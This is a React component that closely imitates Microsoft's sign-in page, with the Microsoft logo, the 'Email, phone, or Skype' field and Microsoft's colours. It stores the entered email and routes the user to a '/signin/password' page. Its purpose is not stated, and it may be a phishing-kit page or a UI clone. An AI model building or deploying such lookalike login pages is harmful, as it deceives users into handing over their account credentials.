import React, { useState } from "react";
import {
  BackgroundImage,
  Box,
  Text,
  Input,
  Button,
  Image,
} from "@mantine/core";
import { useMediaQuery } from "@mantine/hooks";

import { useNavigate } from "react-router-dom";

import Footer from "../components/Footer";

import backgroundimg from "../assets/Background-blurryGradient.svg";
import logoimg from "../assets/microsoft_logo.svg";

type Props = {
  onSubmit: (e: any) => void;
  errorMsg: string;
};

function Home({ setEmail }: any) {
  const navigate = useNavigate();
  const mobile = useMediaQuery("(max-width: 600px)");
  const [errorMsg, setErrorMsg] = useState("");

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const email = e.target[0].value;

    if (email.length < 1) {
      setErrorMsg("Please enter a valid email address or phone number");
    } else {
      setErrorMsg("");
      setEmail(email);
      navigate("/signin/password");
    }
  };

  return (
    <div>
      {mobile ? (
        <MobileView onSubmit={handleSubmit} errorMsg={errorMsg} />
      ) : (
        <DesktopView onSubmit={handleSubmit} errorMsg={errorMsg} />
      )}
    </div>
  );
}

function DesktopView({ onSubmit, errorMsg }: Props) {
  return (
    <div className='relative'>
      <BackgroundImage src={backgroundimg}>
        <div className='min-h-[96vh] flex items-center justify-center'>
          <form onSubmit={onSubmit} className='signin-card space-y-7'>
            <Box className='space-y-5 flex flex-col items-start'>
              <Image src={logoimg} alt='logo' width={120} height={"100%"} />
              <Text className='text-2xl font-bold'>Sign In</Text>
            </Box>

            <Box className='space-y-3'>
              {errorMsg && (
                <Text className='text-red-600 text-sm'>{errorMsg}</Text>
              )}

              <Input
                placeholder='Email, phone, or Skype'
                variant='unstyled'
                name='email'
                className='border-b border-black focus-within:border-[#0067B8] text-3xl'
              />
            </Box>

            <Box className='flex space-x-2 text-sm'>
              <h6>No account?</h6>
              <a href='#' className='text-[#0067B8]'>
                Create one!
              </a>
            </Box>

            <Box className='flex justify-end'>
              <Button
                type='submit'
                radius='xs'
                className='bg-[#0067B8] text-white px-8'>
                Next
              </Button>
            </Box>
          </form>
        </div>
      </BackgroundImage>
      <Footer />
    </div>
  );
}

function MobileView({ onSubmit, errorMsg }: Props) {
  return (
    <div className='relative'>
      <form onSubmit={onSubmit} className='space-y-7 px-10 py-9'>
        <Box className='space-y-6 flex flex-col items-start'>
          <Image src={logoimg} alt='logo' width={120} height={"100%"} />
          <Text className='text-2xl font-bold'>Sign In</Text>
        </Box>

        <Box className='space-y-3'>
          {errorMsg && <Text className='text-red-600 text-sm'>{errorMsg}</Text>}

          <Input
            placeholder='Email, phone, or Skype'
            variant='unstyled'
            name='email'
            className='border-b border-black focus-within:border-[#0067B8] text-3xl'
          />
        </Box>

        <Box className='flex space-x-2 text-sm'>
          <h6>No account?</h6>
          <a href='#' className='text-[#0067B8]'>
            Create one!
          </a>
        </Box>

        <Box className='flex justify-end'>
          <Button
            type='submit'
            radius='xs'
            className='bg-[#0067B8] text-white px-8'>
            Next
          </Button>
        </Box>
      </form>
      <Footer />
    </div>
  );
}

export default Home;
